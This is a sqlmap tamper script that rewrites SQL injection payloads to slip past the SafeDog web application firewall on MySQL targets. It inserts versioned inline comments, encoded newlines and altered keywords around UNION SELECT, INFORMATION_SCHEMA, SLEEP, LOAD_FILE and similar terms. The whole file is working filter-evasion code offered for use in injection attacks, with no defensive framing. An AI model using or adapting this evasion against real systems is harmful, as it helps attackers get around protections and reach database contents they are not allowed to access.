#!/usr/bin/env python

"""
Copyright (c) 2006-2022 sqlmap developers (http://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""
import random
import os
from lib.core.enums import PRIORITY
from lib.core.settings import UNICODE_ENCODING
__priority__ = PRIORITY.LOW
from lib.core.common import singleTimeWarnMessage
from lib.core.data import kb
from lib.core.enums import DBMS

def dependencies():
    pass


def dependencies():
    singleTimeWarnMessage("Bypass safedog by l1b3ri'%s' only %s" % (os.path.basename(__file__).split(".")[0], DBMS.MYSQL))


def tamper(payload, **kwargs):
    # chars1 = ['%01', '%02', '%03', '%04', '%05', '%06', '%07', '%08', '%09', '%0A', '%0B', '%0C', '%0D', '%0E', '%0F',
    #           '%10', '%11', '%12', '%13', '%14', '%15', '%16', '%17', '%18', '%19', '%1A', '%1B', '%1C', '%1D', '%1E', '%1F', '%20']

    # chars2 = ["/**/", "/*!*/", "/*!safe6*/"] #, "+"]

    # v = random.choice(chars1)

    if payload:
        payload = payload.replace("=","/*!*/=/*!*/")
        payload = payload.replace('OR', '/*!14400Or*/')
        payload = payload.replace("#","/*!*/#")
        payload = payload.replace("--","/*!*/--")
        payload = payload.replace(".", ".+")
        payload = payload.replace('DATABASE(','DATABASE/*//--//*/(')
        payload = payload.replace('VERSION(','VERSION/*//--//*/(')
        payload = payload.replace('CURRENT_USER(','CURRENT_USER/*//--//*/(')
        payload = payload.replace('SYSTEM_USER(','SYSTEM_USER/*//--//*/(')
        payload = payload.replace('SESSION_USER(','SESSION_USER/*//--//*/(')
        payload = payload.replace('USER(','UsEr/*//--//*/(')
        payload = payload.replace('LOAD_FILE(','LOAD_FILE/*//--//*/(')
        payload = payload.replace("SLEEP","/*%0aSLEEP*/")
        payload = payload.replace("LIKE", "/*!%0alike*/")
        payload = payload.replace("CONCAT", "CONCAT/*%0a*/(")
        payload = payload.replace("GROUP BY", "/*%0aGROUP*/BY")
        payload = payload.replace("COUNT","/*%0aCOUNT*/")
        payload = payload.replace("BENCHMARK(", "BENCHMARK/*!%0a(*/")
        payload = payload.replace("EXP", "/*%0aEXP*/")
        payload = payload.replace("EXTRACTVALUE", "/*!%0aapolygon*/")
        payload = payload.replace("UPDATEXML", "/*!%0apolygon*/")
        payload = payload.replace("VARCHAR(", "VARCHAR--%0a(")
        payload = payload.replace("CAST(", "CAST--%0a(")
        payload = payload.replace("CHR(", "CHR--%0a(")
        payload = payload.replace("WNER", "WNER--%0a")
        payload = payload.replace('super_priv','/*!29440/**/super_priv*/')
        payload = payload.replace(" ", "/*!*/")
        payload = payload.replace("ORDER BY", "REGEXP \"[...%25%23]\"   /*!11444order %0a by*/")
        payload = payload.replace("union ALL SELECT", "/*!11444union all%0a select*/")
        payload = payload.replace(" AND", "/*!11444AND*/")
        payload = payload.replace("(SELECT (CASE", "(/*!11444SELECT*/ %0a (CASE")
        payload = payload.replace("UNION SELECT","/*!11444union*/  /*REGEXP \"[...%25%23]\"*/  %0a select /*REGEXP \"[...%25%23]\"*/")
        payload = payload.replace("UNION ALL SELECT", "REGEXP \"[...%0a%23]\" /*!11444union %0a select */ ")
        payload = payload.replace("()", "(%0a /*!80000aaa*/)")
        payload = payload.replace("AS", "/*!11444AS*/")
        payload = payload.replace("FROM", "/*!11444FROM*/")
        payload = payload.replace('INFORMATION_SCHEMA','--+/*%0aINFORMATION_SCHEMA--+*/%0a')

    return payload